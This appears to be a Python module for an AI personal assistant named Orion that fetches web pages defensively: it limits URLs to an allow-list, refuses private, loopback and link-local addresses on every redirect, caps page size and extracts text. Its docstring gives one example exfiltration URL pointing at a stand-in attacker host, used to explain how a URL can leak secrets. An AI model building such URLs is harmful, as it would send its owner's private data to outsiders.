"""Fetching a page safely: public addresses only, bounded size, text extracted by code.

A page is fetched only at an address the owner gave or a search returned (`WebState.allowed`):
a URL is also a way to send data out (`https://evil.example/?q=<the owner's secrets>`), so the
model never gets to make one up. Private, loopback and link-local addresses are refused, on
every redirect, so a page cannot point Orion at the guardian or the local network.
"""

from __future__ import annotations

import asyncio
import ipaddress
import socket
from collections.abc import Awaitable, Callable
from dataclasses import dataclass, field
from html.parser import HTMLParser
from urllib.parse import urldefrag, urljoin, urlsplit

import httpx

MAX_BYTES = 3_000_000
MAX_REDIRECTS = 5
_SKIP = {"script", "style", "noscript", "svg", "template", "head"}
_BLOCK = {"p", "div", "br", "li", "tr", "h1", "h2", "h3", "h4", "h5", "h6", "section", "article"}
USER_AGENT = "Mozilla/5.0 (compatible; Orion personal assistant; reads on its owner's behalf)"


class FetchError(RuntimeError):
    """The page cannot be read (refused address, error, not text)."""


@dataclass(frozen=True)
class Link:
    url: str
    text: str


@dataclass
class Page:
    url: str
    title: str = ""
    text: str = ""
    links: list[Link] = field(default_factory=list[Link])


def normalize(url: str) -> str:
    """The form URLs are compared in: no fragment, scheme and host lowercase."""
    bare, _ = urldefrag(url.strip())
    parts = urlsplit(bare)
    if parts.scheme.lower() not in ("http", "https") or not parts.hostname:
        return ""
    return parts._replace(scheme=parts.scheme.lower(), netloc=parts.netloc.lower()).geturl()


async def check_public(host: str, port: int) -> None:
    try:
        infos = await asyncio.get_running_loop().getaddrinfo(host, port, type=socket.SOCK_STREAM)
    except OSError as exc:
        raise FetchError(f"unknown host {host}") from exc
    for info in infos:
        address = ipaddress.ip_address(info[4][0])
        if not address.is_global:
            raise FetchError(f"{host} is not a public address")


class _Extractor(HTMLParser):
    def __init__(self, base: str) -> None:
        super().__init__(convert_charrefs=True)
        self.base = base
        self.parts: list[str] = []
        self.title = ""
        self.links: list[Link] = []
        self._skipping = 0
        self._in_title = False
        self._href: str | None = None
        self._anchor: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag in _SKIP:
            self._skipping += 1
        if tag == "title":
            self._in_title = True
        if tag in _BLOCK:
            self.parts.append("\n")
        if tag == "a":
            href = dict(attrs).get("href")
            self._href = normalize(urljoin(self.base, href)) if href else None
            self._anchor = []

    def handle_endtag(self, tag: str) -> None:
        if tag in _SKIP and self._skipping:
            self._skipping -= 1
        if tag == "title":
            self._in_title = False
        if tag == "a" and self._href:
            text = " ".join(" ".join(self._anchor).split())[:100]
            self.links.append(Link(self._href, text))
            self._href = None

    def handle_data(self, data: str) -> None:
        if self._in_title:
            self.title += data
            return
        if self._skipping:
            return
        self.parts.append(data)
        if self._href:
            self._anchor.append(data)


def extract(url: str, html: str) -> Page:
    parser = _Extractor(url)
    parser.feed(html)
    lines = (" ".join(line.split()) for line in "".join(parser.parts).splitlines())
    seen: set[str] = set()
    links: list[Link] = []
    for link in parser.links:
        if link.url and link.url not in seen and link.url != url:
            seen.add(link.url)
            links.append(link)
    return Page(url, " ".join(parser.title.split()), "\n".join(x for x in lines if x), links)


Check = Callable[[str, int], Awaitable[None]]


async def fetch(client: httpx.AsyncClient, url: str, check: Check | None = None) -> Page:
    """GET a public page, following redirects by hand (each target is checked)."""
    check = check or check_public
    current = url
    for _ in range(MAX_REDIRECTS + 1):
        parts = urlsplit(current)
        if parts.scheme not in ("http", "https") or not parts.hostname:
            raise FetchError(f"not a web address: {current}")
        await check(parts.hostname, parts.port or (443 if parts.scheme == "https" else 80))
        try:
            async with client.stream(
                "GET", current, headers={"user-agent": USER_AGENT}, follow_redirects=False
            ) as response:
                if response.is_redirect and "location" in response.headers:
                    current = normalize(urljoin(current, response.headers["location"]))
                    continue
                if response.status_code >= 400:
                    raise FetchError(f"{current} answered {response.status_code}")
                kind = response.headers.get("content-type", "")
                if not any(t in kind for t in ("html", "text", "xml", "json")):
                    raise FetchError(f"{current} is not text ({kind or 'unknown type'})")
                body = bytearray()
                async for chunk in response.aiter_bytes():
                    body += chunk
                    if len(body) > MAX_BYTES:
                        break
                text = bytes(body).decode(response.encoding or "utf-8", errors="replace")
        except httpx.HTTPError as exc:
            raise FetchError(f"{current} unreachable: {exc!r}") from exc
        if "html" in kind:
            return extract(current, text)
        return Page(current, "", text)
    raise FetchError(f"too many redirects from {url}")
